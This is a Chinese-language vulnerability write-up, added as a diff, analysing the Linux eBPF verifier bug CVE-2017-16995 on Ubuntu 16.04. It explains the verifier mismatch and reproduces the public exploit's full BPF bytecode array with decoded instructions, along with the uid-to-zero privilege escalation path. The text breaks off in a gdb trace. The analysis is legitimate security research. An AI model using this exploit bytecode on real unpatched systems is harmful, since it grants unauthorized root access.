@@ -1,0 +1,125 @@
+### 前言：
+2018年3月中旬，Twitter 用户 @Vitaly Nikolenko 发布消息，称 ubuntu 最新版本（Ubuntu
+16.04）存在高危的本地提权漏洞，而且推文中还附上了 EXP 下载地址。
+由于该漏洞成功在aws Ubuntu镜像上复现，被认为是0DAY，引起了安全圈同学们的广泛关注。大体浏览了
+一下exp代码，发现利用姿势很优雅，没有ROP，没有堆，没有栈，比较感兴趣，不过等了几天也没发现有详细的漏洞分析，正好赶上周末，便自己跟了一下：）
+经过一番了解发现这个漏洞并不是什么0DAY，最早是去年12月21号Google Project Zero团队的Jann
+Horn发现并报告的，编号为CVE-2017-16995，作者在报告该漏洞的时候附了一个DOS的POC。另外，最早公开发布可成功提权exploit也不是Vitaly
+Nikolenko，而是[Bruce
+Leidl](https://twitter.com/bleidl)，其在12月21号就把完整的提权exploit公布到了github上，地址：。
+### 技术分析
+#### eBPF简介
+众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley
+Packet
+Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。BPF发展经历了2个阶段，cBPF（classic
+BPF）和eBPF（extend BPF），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。
+#### eBPF虚拟指令系统
+eBPF虚拟指令系统属于RISC，拥有10个虚拟寄存器，r0-r10，在实际运行时，虚拟机会把这10个寄存器一一对应于硬件CPU的10个物理寄存器，以x64为例，对应关系如下：
+    R0 – rax
+        R1 - rdi
+        R2 - rsi
+        R3 - rdx
+        R4 - rcx
+        R5 - r8
+        R6 - rbx
+        R7 - r13
+        R8 - r14
+        R9 - r15
+        R10 – rbp（帧指针，frame pointer）
+每一条指令的格式如下：
+    struct bpf_insn {
+        __u8    code;       /* opcode */
+        __u8    dst_reg:4;  /* dest register */
+        __u8    src_reg:4;  /* source register */
+        __s16   off;        /* signed offset */
+        __s32   imm;        /* signed immediate constant */
+    };
+如一条简单的x86赋值指令：mov eax,0xffffffff,对应的BPF指令为：BPF_MOV32_IMM(BPF_REG_2,
+0xFFFFFFFF)，其对应的数据结构为：
+    #define BPF_MOV32_IMM(DST, IMM)                 \
+        ((struct bpf_insn) {                    \
+            .code  = BPF_ALU | BPF_MOV | BPF_K,     \
+            .dst_reg = DST,                 \
+            .src_reg = 0,                   \
+            .off   = 0,                 \
+            .imm   = IMM })
+其在内存中的值为：\xb4\x09\x00\x00\xff\xff\xff\xff。
+关于BPF指令系统此处就不再赘述，只要明确以下两点即可：1.其为RISC指令系统，也就是说每条指令大小都是一样的；2.其虚拟的10个寄存器一一对应于物理cpu的寄存器，且功能类似，比如BPF的r10寄存器和rbp一样指向栈，r0用于返回值。
+#### BPF的加载过程：
+一个典型的BPF程序流程为：
+  1. 用户程序调用syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。
+  2. 用户程序调用syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr))来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。
+  3. 用户程序通过调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)将我们写的BPF程序绑定到指定的socket上。Progfd为上一步骤的返回值。
+  4. 用户程序通过操作上一步骤中的socket来触发BPF真正执行。
+#### BPF的安全校验
+Bpf指令的校验是在函数do_check中，代码路径为kernel/bpf/verifier.c。do_check通过一个无限循环来遍历我们提供的bpf指令，
+理论上虚拟执行和真实执行的执行路径应该是完全一致的。如果步骤2安全校验过程中的虚拟执行路径和步骤4
+bpf的真实执行路径不完全一致的话，会怎么样呢？看下面的例子：
+    1.BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */
+    2.BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) {        */
+    3.BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */
+    4.BPF_EXIT_INSN()
+    5.……
+第一条指令是个简单的赋值语句，把0xFFFFFFFF这个值赋值给r9.
+第二条指令是个条件跳转指令，如果r9等于0xFFFFFFFF，则退出程序，终止执行；如果r9不等于0xFFFFFFFF，则跳过后面2条执行继续执行第5条指令。
+虚拟执行的时候，do_check检测到第2条指令等式恒成立，所以认为BPF_JNE的跳转永远不会发生，第4条指令之后的指令永远不会执行，所以检测结束，do_check返回成功。
+真实执行的时候，由于一个符号扩展的bug，导致第2条指令中的等式不成立，于是cpu就跳转到第5条指令继续执行，这里是漏洞产生的根因，这4条指令，可以绕过BPF的代码安全检查。既然安全检查被绕过了，用户就可以随意往内核中注入代码了，提权就水到渠成了：先获取到task_struct的地址，然后定位到cred的地址，然后定位到uid的地址，然后直接将uid的值改为0，然后启动/bin/bash。
+### 漏洞分析
+下面结合真实的exp来动态分析一下漏洞的执行过程。
+Vitaly Nikolenko公布的这个exp，关键代码就是如下这个prog数组：
+这个数组就是BPF的指令数据，想要搞清楚exp的机理，首先要把这堆16进制数据翻译成BPF指令，翻译结果如下：
+    bytes="\xb4\x09\x00\x00\xff\xff\xff\xff"\  #BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */
+    "\x55\x09\x02\x00\xff\xff\xff\xff"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) {        */
+    "\xb7\x00\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN()
+    "\x18\x19\x00\x00\x03\x00\x00\x00"\  # BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */
+    "\x00\x00\x00\x00\x00\x00\x00\x00"\
+    #BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map的第1个元素放到r6
+    "\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
+    "\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
+    "\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
+    "\x62\x0a\xfc\xff\x00\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = idx */
+    "\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
+    "\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
+    "\x79\x06\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */
+    #BPF_MAP_GET(1, BPF_REG_7)  r7=address，取map的第2个元素放到r7
+    "\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
+    "\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
+    "\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
+    "\x62\x0a\xfc\xff\x01\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = idx */
+    "\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
+    "\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
+    "\x79\x07\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */
+    #BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map的第3个元素放到r8
+    "\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
+    "\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
+    "\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
+    "\x62\x0a\xfc\xff\x02\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = idx */
+    "\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
+    "\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
+    "\x79\x08\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */
+    "\xbf\x02\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0               */
+    "\xb7\x00\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */
+    "\x55\x06\x03\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */
+    "\x79\x73\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),
+    "\x7b\x32\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),
+    "\x55\x06\x02\x00\x01\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),
+    "\x7b\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
+    "\x7b\x87\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
+    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
+    在do_check上打个断点，编译运行，成功断了下来，先看一下调用栈：
+    (gdb) bt
+    #0  do_check (env=0xffff880078190000)
+        at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/verifier.c:1724
+    #1  0xffffffff8117c057 in bpf_check (prog=0xffff880034003e10, 
+        attr=)
+        at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/verifier.c:2240
+    #2  0xffffffff81178631 in bpf_prog_load (attr=0xffff880034003ee0)
+        at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/syscall.c:679
+    #3  0xffffffff81178d3a in SYSC_bpf (size=48, uattr=, 
+        cmd=)
